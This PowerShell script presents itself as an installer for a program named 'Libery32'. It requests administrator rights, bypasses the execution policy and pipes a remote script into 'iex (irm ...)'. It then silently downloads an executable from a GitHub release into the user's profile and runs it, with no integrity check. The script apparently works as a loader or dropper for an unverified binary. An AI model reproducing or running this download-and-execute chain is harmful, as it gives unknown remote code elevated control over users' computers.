param(
    [string]$u = 'https://github.com/lubyralph6-maker/Libery32.ps1/releases/latest/download/Libery32.exe',
    [string]$p = '',
    [string]$s = 'https://raw.githubusercontent.com/lubyralph6-maker/Libery32.ps1/refs/heads/main/Libery32.ps1'
)

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $ue = $u.Replace("'", "''")
    $pe = $p.Replace("'", "''")
    $se = $s.Replace("'", "''")
    Start-Process powershell -Verb RunAs -ArgumentList "-nop -ep bypass -c `"`$u='$ue'; `$p='$pe'; iex (irm '$se')`""
    exit
}

$t = if ($p -and (Test-Path $p)) { $p } else { Join-Path $env:LOCALAPPDATA 'Libery32' }
if (-not (Test-Path $t)) {
    New-Item -ItemType Directory -Path $t -Force | Out-Null
}

Get-Process Libery32 -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

$f = Join-Path $env:TEMP 'libery32.tmp'
try {
    Invoke-WebRequest $u -OutFile $f -UseBasicParsing
} catch {
    Write-Host 'Download failed. Upload Libery32.exe to GitHub Releases first.' -ForegroundColor Red
    Write-Host $u -ForegroundColor Yellow
    exit 1
}

$exe = Join-Path $t 'Libery32.exe'
Copy-Item $f $exe -Force
Remove-Item $f -Force -ErrorAction SilentlyContinue

if (-not (Test-Path $exe)) {
    Write-Host 'Libery32.exe not found after download.' -ForegroundColor Red
    exit 1
}

Start-Process -FilePath $exe -WorkingDirectory $t
Write-Host 'OK'
